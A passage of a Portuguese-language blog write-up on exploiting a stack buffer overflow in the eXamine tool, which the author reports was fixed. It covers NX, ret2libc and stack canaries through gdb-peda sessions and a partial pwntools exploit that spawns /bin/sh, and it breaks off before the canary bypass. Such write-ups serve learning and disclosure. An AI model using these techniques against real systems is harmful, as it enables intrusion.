<!DOCTYPE html>
<html>
<style>

		@font-face { font-family: "gohu"; src: url("/gohu.woff") format('woff'); }
		body {
			font-family: 'gohu', monospace;
			max-width: 50em;
			margin: 0 auto;
			color: white;
			background: black;
			line-height: calc(1ex / 0.32);
			margin-top: 3em;
		}
		pre {
			font-family: 'gohu', monospace;
			white-space: pre-wrap;
			line-height: 125%;
      background-color: #111;
      padding: 1em;
		}
		@media only screen and (max-width:768px) {
			body {
				max-width:100%;
			}
		}
		a:link {
			color: #0a0 ;
		}
		a:visited {
			color: #004100 ;
		}
		td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
		span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
		td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
		span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
		.codehilite .hll { background-color: #0000ff }
		.codehilite { background: #000000; }
		.codehilite .c { color: #00ff00 } /* Comment */
		.codehilite .k { color: #ff0000 } /* Keyword */
		.codehilite .ch { color: #00ff00 } /* Comment.Hashbang */
		.codehilite .cm { color: #00ff00 } /* Comment.Multiline */
		.codehilite .cp { color: #e5e5e5 } /* Comment.Preproc */
		.codehilite .cpf { color: #00ff00 } /* Comment.PreprocFile */
		.codehilite .c1 { color: #00ff00 } /* Comment.Single */
		.codehilite .cs { color: #00ff00 } /* Comment.Special */
		.codehilite .kc { color: #ff0000 } /* Keyword.Constant */
		.codehilite .kd { color: #ff0000 } /* Keyword.Declaration */
		.codehilite .kn { color: #ff0000 } /* Keyword.Namespace */
		.codehilite .kp { color: #ff0000 } /* Keyword.Pseudo */
		.codehilite .kr { color: #ff0000 } /* Keyword.Reserved */
		.codehilite .kt { color: #ee82ee } /* Keyword.Type */
		.codehilite .s { color: #87ceeb } /* Literal.String */
		.codehilite .no { color: #7fffd4 } /* Name.Constant */
		.codehilite .nf { color: #ffff00 } /* Name.Function */
		.codehilite .nv { color: #eedd82 } /* Name.Variable */
		.codehilite .sa { color: #87ceeb } /* Literal.String.Affix */
		.codehilite .sb { color: #87ceeb } /* Literal.String.Backtick */
		.codehilite .sc { color: #87ceeb } /* Literal.String.Char */
		.codehilite .dl { color: #87ceeb } /* Literal.String.Delimiter */
		.codehilite .sd { color: #87ceeb } /* Literal.String.Doc */
		.codehilite .s2 { color: #87ceeb } /* Literal.String.Double */
		.codehilite .se { color: #87ceeb } /* Literal.String.Escape */
		.codehilite .sh { color: #87ceeb } /* Literal.String.Heredoc */
		.codehilite .si { color: #87ceeb } /* Literal.String.Interpol */
		.codehilite .sx { color: #87ceeb } /* Literal.String.Other */
		.codehilite .sr { color: #87ceeb } /* Literal.String.Regex */
		.codehilite .s1 { color: #87ceeb } /* Literal.String.Single */
		.codehilite .ss { color: #87ceeb } /* Literal.String.Symbol */
		.codehilite .fm { color: #ffff00 } /* Name.Function.Magic */
		.codehilite .vc { color: #eedd82 } /* Name.Variable.Class */
		.codehilite .vg { color: #eedd82 } /* Name.Variable.Global */
		.codehilite .vi { color: #eedd82 } /* Name.Variable.Instance */
		.codehilite .vm { color: #eedd82 } /* Name.Variable.Magic */
	
</style>
<head>
  <meta charset="UTF-8">
</head>

<body><h1>Bypassando NX e Canary em x86</h1>
<p>1523577600</p>
<p>Ou “pwning for dummies”</p>
<p>Mês passado o <a href="https://medium.com/u/ab160d5eb7a4">Fernando Mercês</a> pediu pelo <a href="https://twitter.com/MercesFernando/status/979170684881555457">Twitter</a> que reportássemos bugs em uma ferramenta dele. Como estava estudando <em>pwning,</em> imaginei que procurar por vulnerabilidades nos repositórios dele seria um bom desafio. <em>(</em> ̶<em>s̶o̶r̶r̶y̶ ̶m̶e̶r̶c̶ê̶s̶ )</em></p>
<p>Encontrei um <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow">Stack Buffer Overflow</a> na tool <a href="https://github.com/merces/examine"><strong>eXamine</strong></a> e escrevi um <em>exploit</em> <em>bypassando</em> várias proteções “modernas” como o NX e o Canary.<br />
Esse texto é um <em>write up</em> bem introdutório sobre essas proteções e como foi o processo de escrever o <em>exploit</em> com o <a href="https://github.com/Gallopsled/pwntools"><em>pwntools</em></a>  para a arquitetura x86, depois soltarei outro texto para x64, também assumo que o leitor já tenha algum conhecimento sobre <em>buffer overflows</em>, <em>Assembly</em> e etc.</p>
<p>A vulnerabilidade foi consertada em tempo recorde de 2 dias.<br />
<em>Se você for</em> um <strong><em>l33t0</em></strong> <em>apressado, o exploit tá lá embaixo.</em></p>
<h3>Stack Buffer Overflow</h3>
<p>Reprodução da função main do código vulnerável</p>
<div class="codehilite"><pre><span></span><code><span class="w">            </span><span class="nc">int</span><span class="w"> </span><span class="n">main</span><span class="p">(</span><span class="nc">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="nc">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="err">[]</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">                </span><span class="nc">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
<span class="w">                </span><span class="nc">char</span><span class="w"> </span><span class="n">s</span><span class="o">[</span><span class="n">MAX_CMD_LINE</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">c</span><span class="p">;</span>

<span class="w">                </span><span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">MAX_CMD_LINE</span><span class="p">);</span>

<span class="w">                </span><span class="o">//</span><span class="w"> </span><span class="n">Loop</span><span class="w"> </span><span class="n">until</span><span class="w"> </span><span class="n">Ctrl</span><span class="o">+</span><span class="n">C</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">pressed</span>
<span class="w">                </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getchar</span><span class="p">())</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">EOF</span><span class="p">)</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="k">End</span><span class="w"> </span><span class="k">Of</span><span class="w"> </span><span class="k">File</span><span class="w"> </span><span class="n">reached</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="n">reading</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">pipe</span>
<span class="w">                        </span><span class="k">break</span><span class="p">;</span>

<span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;\n&#39;</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">                        </span><span class="n">examine</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
<span class="w">                        </span><span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">MAX_CMD_LINE</span><span class="p">);</span>
<span class="w">                        </span><span class="n">i</span><span class="o">=-</span><span class="mi">1</span><span class="p">;</span>
<span class="w">                        </span><span class="n">putchar</span><span class="p">(</span><span class="s1">&#39;\n&#39;</span><span class="p">);</span>
<span class="w">                    </span><span class="err">}</span>
<span class="w">                    </span><span class="n">s</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">;</span>
<span class="w">                </span><span class="err">}</span>

<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">            </span><span class="err">}</span>
</code></pre></div>


<p>Note a linha 18, ela escreve um <em>char</em> na array “<em>s”</em> mas nunca checa se o “<em>i”</em> é maior do que o tamanho da <em>array</em>. Assim, podemos escrever o quanto quisermos na <em>stack.</em> Agora fica fácil de redirecionar a execução do programa para onde quisermos, é só colocar um <em>shellcode</em> na <em>stack</em> e executa-lo, certo ?</p>
<p>Errado ( ̶o̶t̶á̶r̶i̶o̶!̶), o problema é que essa vulnerabilidade já tem mais de <a href="https://en.wikipedia.org/wiki/Buffer_overflow#History">40 anos</a>, e com o tempo os sistemas operacionais foram implementando várias proteções que dificultam enormemente a exploração.</p>
<p>Utilizando o <a href="https://github.com/RobinDavid/checksec/blob/master/checksec.sh"><em>checksec</em></a> conseguimos verificar todas as proteções no nosso binário: <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries">Canary</a>; <a href="https://tk-blog.blogspot.com.br/2009/02/relro-not-so-well-known-memory.html">RELRO</a> e <a href="https://en.wikipedia.org/wiki/NX_bit">NX</a> — Eu desabilitei o <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> da minha máquina, porque ̶s̶o̶u̶ ̶n̶0̶0̶b̶ ativado faria com que as alocações de memória fossem aleatórias, tentarei fazer um <em>exploit</em> para <em>bypassar</em> ele também no futuro.</p>
<div class="codehilite"><pre><span></span><code>            $ checksec examine32  
            \[\*\] ‘/home/vagrant/host/CTF/mentebinaria/examine/examine32’  
             Arch: i386–32-little  
             RELRO: Partial RELRO  
             Stack: Canary found  
             NX: NX enabled  
             PIE: No PIE (0x8048000)  
             FORTIFY: Enabled
</code></pre></div>


<h3>No-eXecute</h3>
<p>Também conhecido como NX, essa proteção determina quais áreas da memória poderão ser executadas. Impedindo assim, que o atacante coloque seu <em>payload</em> malicioso na <em>Stack</em> e o execute com alguma vulnerabilidade. Existem inúmeras maneiras de evitar essa proteção, neste <em>exploit</em> eu usei o _ret2libc — _recomendo a leitura do primeiro <a href="http://seclists.org/bugtraq/1997/Aug/63">artigo sobre o assunto</a>.</p>
<p>A idéia principal do <em>ret2libc</em> é que ao invés de redirecionarmos a execução do programa para o nosso payload na <em>stack,</em> vamos executar algo da <a href="https://en.wikipedia.org/wiki/C_standard_library">libc</a> como um <em>system(“/bin/sh”)</em> por exemplo. Para fazermos isso precisamos passar argumentos para a função. No x86 os argumentos ficam na <em>stack</em>, então temos que prepará-la de acordo com o que quisermos fazer. No caso nossa stack terá que se parecer com essa :</p>
<p><img alt="" src="img/1__LjEI__MYRVHuZ8UHdYKsVFQ.png" /></p>
<p>Então temos que descobrir os endereços. Para fazer isso podemos utilizar o <a href="https://en.wikipedia.org/wiki/GNU_Debugger">GDB</a> com o <a href="https://github.com/longld/peda"><strong>peda</strong></a>. Descobrindo os endereços de <em>exit</em> e de <em>system</em> na <em>libc</em>:</p>
<div class="codehilite"><pre><span></span><code><span class="w">            </span><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="o">$</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="n">system</span><span class="w">  </span>
<span class="w">            </span><span class="o">$</span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="o">&lt;</span><span class="n">text</span><span class="w"> </span><span class="n">variable</span><span class="p">,</span><span class="w"> </span><span class="n">no</span><span class="w"> </span><span class="n">debug</span><span class="w"> </span><span class="n">info</span><span class="o">&gt;</span><span class="p">}</span><span class="w"> </span><span class="mh">0xf7e19e70</span><span class="w"> </span><span class="o">&lt;</span><span class="n">system</span><span class="o">&gt;</span><span class="w">  </span>
<span class="w">            </span><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="o">$</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="n">exit</span><span class="w">  </span>
<span class="w">            </span><span class="o">$</span><span class="mi">2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="o">&lt;</span><span class="n">text</span><span class="w"> </span><span class="n">variable</span><span class="p">,</span><span class="w"> </span><span class="n">no</span><span class="w"> </span><span class="n">debug</span><span class="w"> </span><span class="n">info</span><span class="o">&gt;</span><span class="p">}</span><span class="w"> </span><span class="mh">0xf7e0cf50</span><span class="w"> </span><span class="o">&lt;</span><span class="n">exit</span><span class="o">&gt;</span>
</code></pre></div>


<p>Também precisamos encontrar o endereço da string “/bin/sh” :</p>
<div class="codehilite"><pre><span></span><code><span class="w">            </span><span class="nv">gdb</span><span class="o">-</span><span class="nv">peda</span>$<span class="w"> </span><span class="nv">find</span><span class="w"> </span>“<span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">sh</span>”<span class="w">  </span>
<span class="w">            </span><span class="nv">Searching</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>‘<span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">sh</span>’<span class="w"> </span><span class="nv">in</span>:<span class="w"> </span><span class="nv">None</span><span class="w"> </span><span class="nv">ranges</span><span class="w">  </span>
<span class="w">            </span><span class="nv">Found</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nv">results</span>,<span class="w"> </span><span class="nv">display</span><span class="w"> </span><span class="nv">max</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nv">items</span>:<span class="w">  </span>
<span class="w">            </span><span class="nv">libc</span><span class="w"> </span>:<span class="w"> </span><span class="mi">0</span><span class="nv">xf7f39fcc</span><span class="w"> </span><span class="ss">(</span>“<span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">sh</span>”<span class="ss">)</span>
</code></pre></div>


<p>Importante notar que é necessário saber qual a versão do <em>libc</em> na máquina alvo para encontrar as funções desejadas (<em>system</em> por exemplo), calculando os <em>offsets</em> através do endereço base de memória alocada para <em>libc</em>. Pois os <em>offsets</em> se diferenciam entre as versões. Aqui tem uma database de versões para ajudar a encontrar : <a href="https://github.com/niklasb/libc-database">github.com/niklasb/libc-database</a> — Discutirei isso mais a fundo no próximo post.</p>
<p>Vamos começar o esboço do nosso <em>exploit</em>.  </p>
<p>from pwn import *</p>
<div class="codehilite"><pre><span></span><code><span class="w">            </span><span class="nv">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">process</span><span class="ss">(</span><span class="s2">&quot;./examine32&quot;</span><span class="ss">)</span>
<span class="w">            </span><span class="nv">system</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="nv">xf7e19e70</span>
<span class="w">            </span><span class="k">exit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="nv">xf7e0cf50</span>
<span class="w">            </span><span class="nv">bash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="nv">xf7f39fcc</span>
<span class="w">            </span><span class="nv">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>???

<span class="w">            </span><span class="nv">exploit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="nv">offset</span><span class="o">+</span><span class="nv">p32</span><span class="ss">(</span><span class="nv">system</span><span class="ss">)</span><span class="o">+</span><span class="nv">p32</span><span class="ss">(</span><span class="k">exit</span><span class="ss">)</span><span class="o">+</span><span class="nv">p32</span><span class="ss">(</span><span class="nv">bash</span><span class="ss">)</span><span class="o">+</span><span class="s2">&quot;\xff&quot;</span>

<span class="w">            </span><span class="nv">p</span>.<span class="nv">sendline</span><span class="ss">(</span><span class="nv">exploit</span><span class="ss">)</span>
<span class="w">            </span><span class="nv">p</span>.<span class="nv">interactive</span><span class="ss">()</span>
</code></pre></div>


<p>Abrimos o processo, declaramos os endereços, montamos o <em>payload</em> e adicionamos o <em>0xff</em> para servir de EOF — Vide linha 9 do código, precisamos do EOF para atingirmos o <em>return.</em></p>
<p>Mas ainda não sabemos o <em>offset,</em> vamos descobri-lo usando o GDB :<br />
<em>Leia os # , são meus comentários.</em></p>
<div class="codehilite"><pre><span></span><code><span class="w">            </span><span class="o">$</span><span class="w"> </span><span class="n">gdb</span><span class="w"> </span><span class="o">./</span><span class="n">examine32</span><span class="w">  </span>
<span class="w">            </span>\<span class="p">[</span><span class="o">...</span><span class="w"> </span><span class="n">cortado</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">            </span><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="o">$</span><span class="w"> </span><span class="n">pattern</span>\<span class="n">_create</span><span class="w"> </span><span class="mi">2000</span><span class="w"> </span><span class="n">pat</span><span class="w">   </span>
<span class="w">            </span><span class="n">Writing</span><span class="w"> </span><span class="n">pattern</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="mi">2000</span><span class="w"> </span><span class="n">chars</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">filename</span><span class="w"> </span><span class="err">“</span><span class="n">pat</span><span class="err">”</span><span class="w">  </span>
<span class="w">            </span>\<span class="c1"># Primeiro criamos um arquivo &quot;pat&quot; de tamanho 2000 com um pattern para podermos identificar exatamente o offset  </span>
<span class="w">            </span><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="o">$</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">pat</span><span class="w"> </span><span class="c1"># rodando o programa com o arquivo pat  </span>
<span class="w">            </span><span class="n">Starting</span><span class="w"> </span><span class="n">program</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">vagrant</span><span class="o">/</span><span class="n">host</span><span class="o">/</span><span class="n">CTF</span><span class="o">/</span><span class="n">mentebinaria</span><span class="o">/</span><span class="n">examine</span><span class="o">/</span><span class="n">examine32</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">pat</span>

<span class="w">            </span><span class="n">Program</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="k">signal</span><span class="w"> </span><span class="n">SIGSEGV</span><span class="p">,</span><span class="w"> </span><span class="n">Segmentation</span><span class="w"> </span><span class="n">fault</span><span class="o">.</span><span class="w">  </span>
<span class="w">            </span>\<span class="c1"># Recebemos um SIGSEGV, vamos analizar por que.  </span>
<span class="w">            </span>\<span class="p">[</span><span class="o">...</span><span class="w"> </span><span class="n">cortado</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">            </span>\<span class="p">[</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="o">-</span><span class="n">code</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="o">-</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0xf7e0c5cb</span><span class="w"> </span><span class="o">&lt;</span><span class="n">getenv</span><span class="o">+</span><span class="mi">107</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">mov</span><span class="w"> </span><span class="n">esi</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span>\<span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x0</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0xf7e0c5ce</span><span class="w"> </span><span class="o">&lt;</span><span class="n">getenv</span><span class="o">+</span><span class="mi">110</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">esi</span><span class="p">,</span><span class="n">esi</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0xf7e0c5d0</span><span class="w"> </span><span class="o">&lt;</span><span class="n">getenv</span><span class="o">+</span><span class="mi">112</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">je</span><span class="w"> </span><span class="mh">0xf7e0c62a</span><span class="w"> </span><span class="o">&lt;</span><span class="n">getenv</span><span class="o">+</span><span class="mi">202</span><span class="o">&gt;</span><span class="w">  </span>
<span class="w">            </span>\<span class="o">=&gt;</span><span class="w"> </span><span class="mh">0xf7e0c5d2</span><span class="w"> </span><span class="o">&lt;</span><span class="n">getenv</span><span class="o">+</span><span class="mi">114</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">cmp</span><span class="w"> </span><span class="n">di</span><span class="p">,</span><span class="n">WORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span>\<span class="p">[</span><span class="n">esi</span>\<span class="p">]</span><span class="w">  </span><span class="c1"># por algum motivo o binário foi parar em getenv e bugou pois o valor de ESI foi sobrescrito  </span>
<span class="w">            </span>\<span class="p">[</span><span class="o">...</span><span class="w"> </span><span class="n">cortado</span>\<span class="p">]</span>

<span class="w">            </span><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="o">$</span><span class="w"> </span><span class="n">bt</span><span class="w"> </span><span class="c1"># vamos checar com o backtrace porque o binário foi parar em getenv  </span>
<span class="w">            </span><span class="c1">#0 0xf7e0c5d2 in getenv () from /lib32/libc.so.6  </span>
<span class="w">            </span><span class="c1">#1 0xf7e4230b in ?? () from /lib32/libc.so.6  </span>
<span class="w">            </span><span class="c1">#2 0xf7ed5c9b in \_\_fortify\_fail () from /lib32/libc.so.6  </span>
<span class="w">            </span><span class="c1">#3 0xf7ed5c2a in \_\_stack\_chk\_fail () from /lib32/libc.so.6 # Opa ,o que é isso ?   </span>
<span class="w">            </span><span class="c1">#4 0x08048767 in main ()</span>
</code></pre></div>


<p>Recebemos um SIGSEGV pois o binário chamou <em>__stack_chk_fail</em>, vamos fazer uma breve análise no <a href="https://www.hex-rays.com/products/ida/">IDA</a> para entendermos porque ele foi parar lá.</p>
<p><img alt="" src="img/1__MjbYO0SYl6xdmCi1XvaY1w.jpeg" /></p>
<p>Na <strong>seta</strong> <strong>1</strong> ele compara o nosso <em>input</em> com <em>0xff </em>, isso corresponde a linha 9 do <em>main</em>, onde ele compara com EOF e que resulta no <em>return</em>. Mas antes de ir para o <em>return</em> ele vai para <strong>seta 2</strong> onde ele compara um valor da <em>stack</em> <em>“$esp+3FCh”</em> com outro um valor <em>“$gs:14h”</em> e checa se são iguais, caso não forem ele chama a função <em>__stack_chk_fail,</em> que causou o erro.</p>
<h3>Canary</h3>
<p>Isto é chamado de Canary, ou <em>stack cookie</em>, um valor randômico que o programa conhece que é colocado na <em>stack</em> e antes de fazer um <em>return</em> é checado se ele foi alterado. Nosso problema é que para fazermos o <em>ret2libc,</em> ou qualquer outra técnica de <em>buffer overflow,</em> vamos acabar sobrescrevendo o Canary. Então para <em>bypassa-lo</em> precisamos conhecer o seu valor.</p>
<p>Mas antes de tentarmos descobrir o valor, precisamos ainda descobrir o <em>offset</em> correto. Para isso, voltemos ao GDB. Vamos basicamente ignorar a checagem do <em>Canary</em> e ver o que acontece.<br />
<em>Leia os # , são meus comentários.</em></p>
<div class="codehilite"><pre><span></span><code><span class="w">            </span><span class="o">$</span><span class="w"> </span><span class="n">gdb</span><span class="w"> </span><span class="o">./</span><span class="n">examine32</span><span class="w">  </span>
<span class="w">            </span><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="o">$</span><span class="w"> </span><span class="n">disas</span><span class="w"> </span><span class="n">main</span><span class="w">  </span>
<span class="w">            </span>\<span class="c1"># Vamos encontrar onde ele faz a checagem que vimos no IDA  </span>
<span class="w">            </span><span class="n">Dump</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">assembler</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">main</span><span class="p">:</span><span class="w">  </span>
<span class="w">             </span>\<span class="p">[</span><span class="o">...</span><span class="w"> </span><span class="n">cortado</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x08048748</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">152</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">xor</span><span class="w"> </span><span class="n">eax</span><span class="p">,</span><span class="n">eax</span><span class="w"> </span><span class="c1"># É aqui onde começa o a checagem do Canary  </span>
<span class="w">             </span><span class="mh">0x0804874a</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">154</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">mov</span><span class="w"> </span><span class="n">esi</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span>\<span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x3fc</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x08048751</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">161</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">xor</span><span class="w"> </span><span class="n">esi</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="n">gs</span><span class="p">:</span><span class="mh">0x14</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x08048758</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">168</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">jne</span><span class="w"> </span><span class="mh">0x8048762</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">178</span><span class="o">&gt;</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x0804875a</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">170</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">lea</span><span class="w"> </span><span class="n">esp</span><span class="p">,</span>\<span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x0804875d</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">173</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">ebx</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x0804875e</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">174</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">esi</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x0804875f</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">175</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">edi</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x08048760</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">176</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">ebp</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x08048761</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">177</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">ret</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x08048762</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">178</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">call</span><span class="w"> </span><span class="mh">0x80485e0</span><span class="w"> </span><span class="o">&lt;</span>\<span class="n">_</span>\<span class="n">_stack</span>\<span class="n">_chk</span>\<span class="n">_fail</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span><span class="w">  </span>
<span class="w">            </span><span class="n">End</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">assembler</span><span class="w"> </span><span class="n">dump</span><span class="o">.</span><span class="w">  </span>
<span class="w">            </span><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="o">$</span><span class="w"> </span><span class="n">b</span><span class="w"> </span>\<span class="o">*</span><span class="w"> </span><span class="n">main</span><span class="o">+</span><span class="mi">161</span><span class="w"> </span><span class="c1"># colocando um breakpoint para logo antes do jne  </span>
<span class="w">            </span><span class="n">Breakpoint</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mh">0x8048751</span><span class="w">  </span>
<span class="w">            </span><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="o">$</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">pat</span><span class="w"> </span><span class="c1"># executando o programa</span>

<span class="w">            </span>\<span class="p">[</span><span class="o">...</span><span class="w"> </span><span class="n">cortado</span>\<span class="p">]</span><span class="w">  </span>
